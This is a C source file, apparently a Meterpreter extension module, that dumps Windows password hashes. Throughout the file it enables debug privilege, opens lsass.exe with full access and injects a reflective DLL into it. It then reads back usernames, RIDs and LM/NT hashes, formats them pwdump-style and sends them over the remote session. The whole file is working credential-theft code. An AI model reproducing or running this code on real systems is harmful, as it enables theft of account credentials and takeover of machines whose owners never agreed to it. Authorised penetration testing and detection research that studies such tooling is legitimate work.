/*!
 * @file passwd.c
 * @brief Functionality for dumping password hashes from lsass.exe.
 */
#include "precomp.h"
#include "common.h"
#include "common_exports.h"
#include "common_metapi.h"
#include "resource.h"
#include "dump_sam.h"
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <ntsecapi.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>

#define LOADER_ORDINAL(x) ((LPCSTR)x)

typedef BOOL(WINAPI* ISWOW64PROCESS)(HANDLE, PBOOL);
typedef ULONG(WINAPI* RTLNTSTATUSTODOSERROR)(NTSTATUS);
typedef NTSTATUS(NTAPI* NTWOW64READVIRTUALMEMORY64)(HANDLE, ULONG64, PVOID, ULONG64, PULONG64);

/* returns whether or not lsass.exe is 64-bit */
BOOL is_lsass64()
{
/* lsass.exe will match the host's native architecture so if we're 64-bit we know it too is 64-bit */
#ifdef _WIN64
	return TRUE;
#else
/* if we're not 64-bit, check if we're running as a 32-bit process on 64-bit windows (WoW64) */
	BOOL bBool = FALSE;
	ISWOW64PROCESS pIsWow64Process = (ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "IsWow64Process");
	if (pIsWow64Process)
		pIsWow64Process(GetCurrentProcess(), &bBool);
	return bBool;
#endif
}

BOOL ReadProcessMemory64(HANDLE hProcess, ULONG64 lpBaseAddress, LPVOID lpBuffer, ULONG nSize, PULONG64 lpNumberOfBytesRead)
{
	HMODULE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
	NTWOW64READVIRTUALMEMORY64 pNtWow64ReadVirtualMemory64 = (NTWOW64READVIRTUALMEMORY64)GetProcAddress(hNtdll, "NtWow64ReadVirtualMemory64");
	if (!pNtWow64ReadVirtualMemory64)
	{
		/* this will only be present in a WOW64 process */
		SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
		return FALSE;
	}

	NTSTATUS ntStatus = pNtWow64ReadVirtualMemory64(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	if (ntStatus)
	{
		RTLNTSTATUSTODOSERROR pRtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)GetProcAddress(hNtdll, "RtlNtStatusToDosError");
		if (pRtlNtStatusToDosError)
		{
			SetLastError(pRtlNtStatusToDosError(ntStatus));
		}
		else
		{
			SetLastError(ERROR_READ_FAULT);
		}
		return FALSE;
	}
	return TRUE;
}

char *string_combine(char *string1, char *string2)
{
	size_t s1len, s2len;

	if (string2 == NULL)
	{
		// nothing to append
		return string1;
	}

	// TODO: what do we want to do if memory allocation fails?
	s2len = strlen(string2);
	if (string1 == NULL)
	{
		// create a new string
		string1 = (char *)malloc(s2len + 1);
		strncpy_s(string1, s2len + 1, string2, s2len + 1);
	}
	else
	{
		// append data to the string
		s1len = strlen(string1);
		string1 = (char *)realloc(string1, s1len + s2len + 1);
		strncat_s(string1, s1len + s2len + 1, string2, s2len + 1);
	}

	return string1;
}

BOOL string_endswith(PCHAR string, PCHAR suffix)
{
	SIZE_T stStringLength = strlen(string);
	SIZE_T stSuffixLength = strlen(suffix);

	if (stStringLength < stSuffixLength)
	{
		return FALSE;
	}
	return strcmp(string + stStringLength - stSuffixLength, suffix) == 0;
}

/* retrieve a handle to lsass.exe */
/*!
 * @brief Locate lsass.exe and get a handle to the process.
 * @returns A handle to the lsass process, if found.
 * @retval NULL Indicates that the lsass process couldn't be found.
 */
HANDLE get_lsass_handle()
{
	DWORD   dwProcessList[1024];
	DWORD   dwProcessListSize;
	HANDLE  hProcess;
	CHAR    ImageFileName[MAX_PATH];
	DWORD   dwCount;

	/* enumerate all pids on the system */
	if (EnumProcesses(dwProcessList, sizeof(dwProcessList), &dwProcessListSize))
	{
		/* only look in the first 256 process ids for lsass.exe */
		if (dwProcessListSize > sizeof(dwProcessList))
		{
			dwProcessListSize = sizeof(dwProcessList);
		}

		/* iterate through all pids, retrieve the executable name, and match to lsass.exe */
		for (dwCount = 0; dwCount < (dwProcessListSize / sizeof(DWORD)); dwCount++)
		{
			if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessList[dwCount]))
			{
				if (GetProcessImageFileName(hProcess, ImageFileName, sizeof(ImageFileName)))
				{
					if (string_endswith(ImageFileName, "\\lsass.exe"))
					{
						return hProcess;
					}
				}
				CloseHandle(hProcess);
			}
		}
	}
	return 0;
}

/*!
 * @brief Add the SE_DEBUG_NAME privilige to the current process.
 */
DWORD set_access_priv()
{
	DWORD dwResult;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv;

	do
	{
		/* open the current process token, retrieve the LUID for SeDebug, enable the privilege, reset the token information */
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
			BREAK_ON_ERROR("[PASSWD] Failed to open process");

		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			BREAK_ON_ERROR("[PASSWD] Failed to lookup priv value");

		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		priv.PrivilegeCount = 1;

		if (!AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
			BREAK_ON_ERROR("[PASSWD] Failed to adjust token privs");

		dwResult = ERROR_SUCCESS;
	} while (0);

	if (hToken)
		CloseHandle(hToken);

	return dwResult;
}

/*!
 * @brief Initialize the context structure that is used for retaining context in the remote thread.
 * @returns Indcation of success or failure. 32-bit version.
 */
DWORD setup_dump_sam_arguments32(FUNCTIONARGS32 *fargs, DWORD dwMillisecondsToWait)
{
	if (!fargs)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return ERROR_INVALID_PARAMETER;
	}

	/* initialize kernel sync objects */
	_snprintf_s(fargs->ReadSyncEvent, sizeof(fargs->ReadSyncEvent), _TRUNCATE, "Global\\%04x%04x", rand(), rand());
	_snprintf_s(fargs->FreeSyncEvent, sizeof(fargs->FreeSyncEvent), _TRUNCATE, "Global\\%04x%04x", rand(), rand());

	/* initialize wait time */
	fargs->dwMillisecondsToWait = dwMillisecondsToWait;

	/* initailize variables */
	fargs->dwDataSize = 0;
	fargs->UsernameHashData.ptr = NULL;

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the context structure that is used for retaining context in the remote thread.
 * @returns Indcation of success or failure. 64-bit version.
 */
DWORD setup_dump_sam_arguments64(FUNCTIONARGS64* fargs, DWORD dwMillisecondsToWait)
{
	if (!fargs)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return ERROR_INVALID_PARAMETER;
	}

	/* initialize kernel sync objects */
	_snprintf_s(fargs->ReadSyncEvent, sizeof(fargs->ReadSyncEvent), _TRUNCATE, "Global\\%04x%04x", rand(), rand());
	_snprintf_s(fargs->FreeSyncEvent, sizeof(fargs->FreeSyncEvent), _TRUNCATE, "Global\\%04x%04x", rand(), rand());

	/* initialize wait time */
	fargs->dwMillisecondsToWait = dwMillisecondsToWait;

	/* initailize variables */
	fargs->dwDataSize = 0;
	fargs->UsernameHashData.ptr = NULL;

	return ERROR_SUCCESS;
}

void free_usernamehash(USERNAMEHASH *pUsernameHash, DWORD dwNumberOfUsers)
{
	for (DWORD dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
	{
		if (pUsernameHash[dwCurrentUserIndex].Username.ptr)
			free(pUsernameHash[dwCurrentUserIndex].Username.ptr);
	}
	free(pUsernameHash);
	return;
}

DWORD process_dump_sam_response(HANDLE hLsassHandle, FUNCTIONARGS* pFunctionArguments, USERNAMEHASH **ppUsernameHashResults, PDWORD pdwNumberOfUsers)
{
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwNumberOfUsers = 0;
	SIZE_T stBytesRead = 0;
	USERNAMEHASH *pUsernameHashResults = NULL;

	do
	{
		/* determine the number of elements and copy over the data */
		dwNumberOfUsers = pFunctionArguments->dwDataSize / sizeof(USERNAMEHASH);
		dprintf("[PASSWD] Dumping data for %u users", dwNumberOfUsers);

		/* allocate space for the results */
		pUsernameHashResults = (USERNAMEHASH*)calloc(dwNumberOfUsers, sizeof(USERNAMEHASH));
		if (!pUsernameHashResults)
		{
			BREAK_WITH_ERROR("[PASSWD] Not enough memory to allocate USERNAMEHASH array", ERROR_NOT_ENOUGH_MEMORY);
		}

		/* copy the context structure */
		if (!ReadProcessMemory(hLsassHandle, pFunctionArguments->UsernameHashData.ptr, pUsernameHashResults, pFunctionArguments->dwDataSize, &stBytesRead))
		{
			BREAK_ON_ERROR("[PASSWD] Failed to read process memory to get user hash data");
		}
		if (stBytesRead != pFunctionArguments->dwDataSize)
		{
			BREAK_WITH_ERROR("[PASSWD] Failed to read process memory to get user hash data (incomplete read)", ERROR_PARTIAL_COPY);
		}
		stBytesRead = 0;

		// save the old mem addy, malloc new space, copy over the data, free the old mem addy
		for (DWORD dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
		{
			dprintf("[PASSWD] Processing response user #%u", dwCurrentUserIndex + 1);
			PCHAR pUsernameAddress = pUsernameHashResults[dwCurrentUserIndex].Username.ptr;

			pUsernameHashResults[dwCurrentUserIndex].Username.ptr = (char*)calloc(pUsernameHashResults[dwCurrentUserIndex].Length + 1, sizeof(char));
			if (!pUsernameHashResults[dwCurrentUserIndex].Username.ptr)
			{
				BREAK_WITH_ERROR("[PASSWD] Failed to allocate memory for the username", ERROR_NOT_ENOUGH_MEMORY);
			}

			if (!ReadProcessMemory(hLsassHandle, pUsernameAddress, pUsernameHashResults[dwCurrentUserIndex].Username.ptr, pUsernameHashResults[dwCurrentUserIndex].Length, &stBytesRead))
			{
				BREAK_ON_ERROR("[PASSWD] Failed to read process memory to get username");
			}
			if (stBytesRead != pUsernameHashResults[dwCurrentUserIndex].Length)
			{
				BREAK_WITH_ERROR("[PASSWD] Failed to read process memory to get username (incomplete read)", ERROR_PARTIAL_COPY);
			}
		}
	} while (FALSE);

	if (dwResult == ERROR_SUCCESS)
	{
		*pdwNumberOfUsers = dwNumberOfUsers;
		*ppUsernameHashResults = pUsernameHashResults;
	}
	else
	{
		*pdwNumberOfUsers = 0;
		*ppUsernameHashResults = NULL;
		if (pUsernameHashResults)  // if something went wrong, free everything we allocated
			free(pUsernameHashResults);
	}
	return dwResult;
}

#ifndef _WIN64
DWORD process_dump_sam_response_wow64(HANDLE hLsassHandle, FUNCTIONARGS64* pFunctionArguments, USERNAMEHASH32** ppUsernameHashResults, PDWORD pdwNumberOfUsers)
{
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwNumberOfUsers = 0;
	ULONG64 ulBytesRead = 0;
	USERNAMEHASH64* pUsernameHashRemote = NULL;
	USERNAMEHASH32* pUsernameHashLocal = NULL;

	dprintf("[PASSWD] Dumping wow64 SAM response data");
	do
	{
		/* determine the number of elements and copy over the data */
		dwNumberOfUsers = pFunctionArguments->dwDataSize / sizeof(USERNAMEHASH64);
		dprintf("[PASSWD] Dumping data for %u users", dwNumberOfUsers);

		/* allocate space for the results */
		pUsernameHashLocal = (USERNAMEHASH32*)calloc(dwNumberOfUsers, sizeof(USERNAMEHASH32));
		if (!pUsernameHashLocal)
		{
			BREAK_WITH_ERROR("[PASSWD] Not enough memory to allocate USERNAMEHASH32 array", ERROR_NOT_ENOUGH_MEMORY);
		}
		pUsernameHashRemote = (USERNAMEHASH64*)calloc(dwNumberOfUsers, sizeof(USERNAMEHASH64));
		if (!pUsernameHashRemote)
		{
			BREAK_WITH_ERROR("[PASSWD] Not enough memory to allocate USERNAMEHASH64 array", ERROR_NOT_ENOUGH_MEMORY);
		}

		/* copy the context structure */
		if (!ReadProcessMemory64(hLsassHandle, pFunctionArguments->UsernameHashData.ul, pUsernameHashRemote, pFunctionArguments->dwDataSize, &ulBytesRead))
		{
			BREAK_ON_ERROR("[PASSWD] Failed to read process memory to get user hash data");
		}
		if (ulBytesRead != pFunctionArguments->dwDataSize)
		{
			BREAK_WITH_ERROR("[PASSWD] Failed to read process memory to get user hash data (incomplete read)", ERROR_PARTIAL_COPY);
		}
		ulBytesRead = 0;

		// save the old mem addy, malloc new space, copy over the data, free the old mem addy
		for (DWORD dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
		{
			dprintf("[PASSWD] Processing response user #%u", dwCurrentUserIndex + 1);

			pUsernameHashLocal[dwCurrentUserIndex].Length = pUsernameHashRemote[dwCurrentUserIndex].Length;
			pUsernameHashLocal[dwCurrentUserIndex].RID = pUsernameHashRemote[dwCurrentUserIndex].RID;
			memcpy(pUsernameHashLocal[dwCurrentUserIndex].Hash, pUsernameHashRemote[dwCurrentUserIndex].Hash, sizeof(pUsernameHashLocal[dwCurrentUserIndex].Hash));
			pUsernameHashLocal[dwCurrentUserIndex].Username.ptr = (char*)calloc(pUsernameHashRemote[dwCurrentUserIndex].Length + 1, sizeof(char));
			if (!pUsernameHashLocal[dwCurrentUserIndex].Username.ptr)
			{
				BREAK_WITH_ERROR("[PASSWD] Failed to allocate memory for the username", ERROR_NOT_ENOUGH_MEMORY);
			}

			if (!ReadProcessMemory64(hLsassHandle, pUsernameHashRemote[dwCurrentUserIndex].Username.ul, pUsernameHashLocal[dwCurrentUserIndex].Username.ptr, pUsernameHashRemote[dwCurrentUserIndex].Length, &ulBytesRead))
			{
				BREAK_ON_ERROR("[PASSWD] Failed to read process memory to get username");
			}
			if (ulBytesRead != pUsernameHashRemote[dwCurrentUserIndex].Length)
			{
				BREAK_WITH_ERROR("[PASSWD] Failed to read process memory to get username (incomplete read)", ERROR_PARTIAL_COPY);
			}
		}
	} while (FALSE);

	if (dwResult == ERROR_SUCCESS)
	{
		*pdwNumberOfUsers = dwNumberOfUsers;
		*ppUsernameHashResults = pUsernameHashLocal;
	}
	else
	{
		*pdwNumberOfUsers = 0;
		*ppUsernameHashResults = NULL;
		if (pUsernameHashLocal)  // if something went wrong, free everything we allocated
			free_usernamehash(pUsernameHashLocal, dwNumberOfUsers);
	}
	if (pUsernameHashRemote)
		free(pUsernameHashRemote);
	return dwResult;
}
#endif

/*!
 * @brief Function driving the SAM dumping.
 * @param dwMillisecondsToWait How long to wait for the results before giving up.
 * @param hashresults Pointer that will receive the hash dump results.
 * @returns Indication of success or failure.
*/
DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults)
{
	HANDLE hLsassHandle = NULL, hReadLock = NULL, hFreeLock = NULL;
	LPVOID pvParameterMemory = NULL;
	SIZE_T stResourceSize = 0;
	SIZE_T stBytesWritten = 0, stBytesRead = 0;
	DWORD dwNumberOfUsers = 0, dwCurrentUserIndex = 0, HashIndex = 0;
	HRSRC hResource = NULL;
	PVOID pInitFunctionArguments = NULL;
	SIZE_T stFunctionArguments = 0;
	USERNAMEHASH *pUsernameHashResults = NULL;
	PVOID UsernameAddress = NULL;
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwLsassArch = PROCESS_ARCH_UNKNOWN;
	char *hashstring = NULL;

	/* METERPRETER CODE */
	char buffer[100];
	/* END METERPRETER CODE */

	do
	{
		/* ORANGE control input - move this to the client ruby side */
		if (dwMillisecondsToWait < 60000)
		{
			dwMillisecondsToWait = 60000;
		}
		if (dwMillisecondsToWait > 300000)
		{
			dwMillisecondsToWait = 300000;
		}

		if (is_lsass64())
		{
			dprintf("[PASSWD] Targeting 64-bit version of lsass");
			dwLsassArch = PROCESS_ARCH_X64;
			hResource = FindResource(hAppInstance, MAKEINTRESOURCEA(IDR_DLL_DUMP_SAM_X64), "DLL");
			stFunctionArguments = sizeof(FUNCTIONARGS64);
			pInitFunctionArguments = calloc(1, stFunctionArguments);
			dwResult = setup_dump_sam_arguments64((FUNCTIONARGS64*)pInitFunctionArguments, dwMillisecondsToWait);
			if (dwResult != ERROR_SUCCESS)
				BREAK_WITH_ERROR("[PASSWD] Failed to initialize the dump sam arguments", dwResult);
			hReadLock = CreateEvent(NULL, FALSE, FALSE, ((FUNCTIONARGS64*)pInitFunctionArguments)->ReadSyncEvent);
			hFreeLock = CreateEvent(NULL, FALSE, FALSE, ((FUNCTIONARGS64*)pInitFunctionArguments)->FreeSyncEvent);
		}
#ifndef _WIN64
		else
		{
			dprintf("[PASSWD] Targeting 32-bit version of lsass");
			dwLsassArch = PROCESS_ARCH_X86;
			hResource = FindResource(hAppInstance, MAKEINTRESOURCEA(IDR_DLL_DUMP_SAM_X86), "DLL");
			stFunctionArguments = sizeof(FUNCTIONARGS32);
			pInitFunctionArguments = calloc(1, stFunctionArguments);
			dwResult = setup_dump_sam_arguments32((FUNCTIONARGS32*)pInitFunctionArguments, dwMillisecondsToWait);
			if (dwResult != ERROR_SUCCESS)
				BREAK_WITH_ERROR("[PASSWD] Failed to initialize the dump sam arguments", dwResult);
			hReadLock = CreateEvent(NULL, FALSE, FALSE, ((FUNCTIONARGS32*)pInitFunctionArguments)->ReadSyncEvent);
			hFreeLock = CreateEvent(NULL, FALSE, FALSE, ((FUNCTIONARGS32*)pInitFunctionArguments)->FreeSyncEvent);
		}
#endif
		if (!hReadLock || !hFreeLock)
			BREAK_ON_ERROR("[PASSWD] Failed to create event lock");

		if (!hResource)
			BREAK_WITH_ERROR("[PASSWD] Failed to find the DLL resource", ERROR_NOT_FOUND);
		
		HGLOBAL hMemory = LoadResource(hAppInstance, hResource);
		if (!hMemory)
			BREAK_ON_ERROR("[PASSWD] Failed to load the DLL resource");

		stResourceSize = SizeofResource(hAppInstance, hResource);
		PVOID dump_sam = LockResource(hMemory);
		dprintf("[PASSWD] Loaded DLL resource at 0x%p (%u bytes)", dump_sam, stResourceSize);

		if ((dwResult = set_access_priv()) != ERROR_SUCCESS) 
			BREAK_WITH_ERROR("[PASSWD] Failed to set SE_DEBUG_NAME privilege", dwResult);

		hLsassHandle = get_lsass_handle();
		if (!hLsassHandle)
			BREAK_WITH_ERROR("[PASSWD] Error obtaining the lsass handle", ERROR_NOT_FOUND);

		dprintf("[PASSWD] Obtained lsass handle: 0x%p", hLsassHandle);

		/* allocate memory for the context structure */
		pvParameterMemory = VirtualAllocEx(hLsassHandle, NULL, stFunctionArguments, MEM_COMMIT, PAGE_READWRITE);
		if (!pvParameterMemory)
			BREAK_ON_ERROR("[PASSWD] Failed to allocate memory");


		/* write context structure into remote process */
		if (!WriteProcessMemory(hLsassHandle, pvParameterMemory, pInitFunctionArguments, stFunctionArguments, &stBytesWritten))
			BREAK_ON_ERROR("[PASSWD] Failed to write process memory for function args");

		if (stBytesWritten != stFunctionArguments)
			BREAK_WITH_ERROR("[PASSWD] Failed to write process memory for function args (incomplete write)", ERROR_PARTIAL_COPY);

		DWORD dwLsassPid = GetProcessId(hLsassHandle);
		dprintf("[PASSWD] Injecting into lsass.exe pid: %u", dwLsassPid);

		/* todo: change the ReflectiveLoader string here, it's silly */
		if ((dwResult = met_api->inject.dll(dwLsassPid, dwLsassArch, dump_sam, (DWORD)stResourceSize, LOADER_ORDINAL(EXPORT_REFLECTIVELOADER), pvParameterMemory, 0)) != ERROR_SUCCESS)
			BREAK_WITH_ERROR("[PASSWD} Unable to inject DLL", dwResult);
		dprintf("[PASSWD] Successfully injected the DLL into lsass.exe");

		/* wait until the data is ready to be collected */
		dwResult = WaitForSingleObject(hReadLock, dwMillisecondsToWait);
		if (dwResult != WAIT_OBJECT_0)
			BREAK_WITH_ERROR("[PASSWD] Failed to wait for the read-lock event to be signaled", dwResult);
		dprintf("[PASSWD] Wait completed on read-lock, fetching arguments");

		/* read results of the injected function */
		if (!ReadProcessMemory(hLsassHandle, pvParameterMemory, pInitFunctionArguments, stFunctionArguments, &stBytesRead))
			BREAK_ON_ERROR("[PASSWD] Failed to read process memory to obtain the arguments");
		if (stBytesRead != stFunctionArguments)
			BREAK_WITH_ERROR("[PASSWD] Failed to read process memory to obtain the arguments (incomplete read)", ERROR_PARTIAL_COPY);
		stBytesRead = 0;

#ifdef _WIN64
		dwResult = process_dump_sam_response(hLsassHandle, pInitFunctionArguments, &pUsernameHashResults, &dwNumberOfUsers);
#else
		if (is_lsass64())
		{
			dwResult = process_dump_sam_response_wow64(hLsassHandle, pInitFunctionArguments, &pUsernameHashResults, &dwNumberOfUsers);
		}
		else
		{
			dwResult = process_dump_sam_response(hLsassHandle, pInitFunctionArguments, &pUsernameHashResults, &dwNumberOfUsers);
		}
#endif
		if (dwResult != ERROR_SUCCESS)
			BREAK_WITH_ERROR("[PASSWD] Failed to read the response data", dwResult);
		dprintf("[PASSWD] Successfully read the response data");

		/* signal that all data has been read and wait for the remote memory to be free'd */
		if (!SetEvent(hFreeLock))
			BREAK_ON_ERROR("[PASSWD] Failed to set the free-lock event");

		dwResult = WaitForSingleObject(hReadLock, dwMillisecondsToWait);
		if (dwResult != WAIT_OBJECT_0)
			BREAK_WITH_ERROR("[PASSWD] Failed to wait for the read-lock event to be signaled", dwResult);
		dprintf("[PASSWD] Wait completed on read-lock, processing response");

		/* display the results and free the malloc'd memory for the username */
		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++)
		{
			/* METERPRETER CODE */
			hashstring = string_combine(hashstring, pUsernameHashResults[dwCurrentUserIndex].Username.ptr);
			hashstring = string_combine(hashstring, ":");
			_snprintf_s(buffer, sizeof(buffer), 30, "%d", pUsernameHashResults[dwCurrentUserIndex].RID);
			hashstring = string_combine(hashstring, buffer);
			hashstring = string_combine(hashstring, ":");
			/* END METERPRETER CODE */

			//printf("%s:%d:", UsernameHashResults[dwCurrentUserIndex].Username.ptr, UsernameHashResults[dwCurrentUserIndex].RID);
			for (HashIndex = 16; HashIndex < 32; HashIndex++)
			{
				/* ORANGE - insert check for ***NO PASSWORD***
					if( (regData[4] == 0x35b4d3aa) && (regData[5] == 0xee0414b5)
					&& (regData[6] == 0x35b4d3aa) && (regData[7] == 0xee0414b5) )
					sprintf( LMdata, "NO PASSWORD*********************" );
					*/
				_snprintf_s(buffer, sizeof(buffer), 3, "%02x", (BYTE)(pUsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
				hashstring = string_combine(hashstring, buffer);
				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
			}
			hashstring = string_combine(hashstring, ":");
			//printf(":");
			for (HashIndex = 0; HashIndex < 16; HashIndex++)
			{
				/* ORANGE - insert check for ***NO PASSWORD***
					if( (regData[0] == 0xe0cfd631) && (regData[1] == 0x31e96ad1)
					&& (regData[2] == 0xd7593cb7) && (regData[3] == 0xc089c0e0) )
					sprintf( NTdata, "NO PASSWORD*********************" );
					*/
				_snprintf_s(buffer, sizeof(buffer), 3, "%02x", (BYTE)(pUsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
				hashstring = string_combine(hashstring, buffer);
				//printf("%02x", (BYTE)(UsernameHashResults[dwCurrentUserIndex].Hash[HashIndex]));
			}

			hashstring = string_combine(hashstring, ":::\n");
			//printf(":::\n");
		}
		dwResult = ERROR_SUCCESS;
	} while (0);

	/* release the event objects */
	if (hReadLock)
		CloseHandle(hReadLock);
	if (hFreeLock)
		CloseHandle(hFreeLock);

	/* free the context structure and the injected function and the results */
	if (pvParameterMemory)
		VirtualFreeEx(hLsassHandle, pvParameterMemory, sizeof(FUNCTIONARGS), MEM_RELEASE);

	/* close handle to lsass */
	if (hLsassHandle)
		CloseHandle(hLsassHandle);

	/* free the results structure including individually malloced space for usernames */
	if (pUsernameHashResults)
		free_usernamehash(pUsernameHashResults, dwNumberOfUsers);

	/* return hashresults */
	*hashresults = hashstring;

	/* return the correct code */
	return dwResult;
}

/*!
 * @brief Handler called by Meterpreter to dump SAM hashes remotely.
 * @param remote Pointer to the \c Remote instance for this request.
 * @param packet Pointer to the \c Packet containing the request.
 * @returns Indication of success or failure.
 */
DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD res = ERROR_SUCCESS;
	char *hashes = NULL;

	do
	{
		dprintf("[PASSWD] Starting hash dump");
		// Get the hashes
		if ((res = control(120000, &hashes)) != ERROR_SUCCESS)
		{
			break;
		}

		met_api->packet.add_tlv_string(response, TLV_TYPE_SAM_HASHES, hashes);

	} while (0);

	met_api->packet.transmit_response(res, remote, response);

	if (hashes)
	{
		free(hashes);
	}

	return res;
}
